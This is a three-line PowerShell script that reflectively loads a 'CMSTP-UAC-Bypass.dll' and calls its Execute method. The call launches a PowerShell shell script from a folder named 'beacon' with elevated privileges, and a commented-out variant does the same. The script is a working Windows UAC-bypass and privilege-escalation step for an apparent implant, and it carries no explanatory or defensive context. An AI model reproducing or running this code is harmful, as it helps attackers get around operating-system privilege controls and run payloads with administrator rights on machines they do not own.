[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\temp\beacon\elevate\CMSTP-UAC-Bypass.dll")) | Out-Null
[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe /C powershell -NoExit -File C:\temp\beacon\shell.ps1") | Out-Null
#[CMSTPBypass]::Execute('C:\Windows\System32\cmd.exe /C powershell -NoExit -Command "C:\temp\beacon\shell.ps1; exit"') | Out-Null
